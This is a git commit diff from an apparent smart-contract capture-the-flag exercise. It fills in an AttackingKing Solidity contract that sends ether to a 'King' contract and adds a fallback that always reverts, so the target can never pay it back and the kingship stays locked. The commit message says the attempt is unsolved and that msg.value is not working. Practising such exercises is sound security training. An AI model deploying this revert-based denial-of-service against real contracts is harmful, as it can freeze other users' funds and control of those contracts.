6d69f5ff41ee8922aaff8957c7019968f32e7231
Rahat <rahat@rahatcodes.com>
2022-07-01 20:15:24 -0400

    unsolved king for debuggin  msg value not working

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -9,8 +9,16 @@ contract AttackingKing {
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
     }
-
+    // make king address payable
+    // use call like before to call the king contract
+    // if fallback/receive function of this contract doesn't handle payments then the 
+    // transfer from the king contract after we become king will never be succesful
     function hackContract() external {
-        // Code me!
+        address payable kingContract = payable(contractAddress);
+        (bool sent, bytes memory data) = kingContract.call{value: msg.value}("");
+    }
+
+    fallback() external {
+        revert("lol lol lol you can't be king");
     }
 }
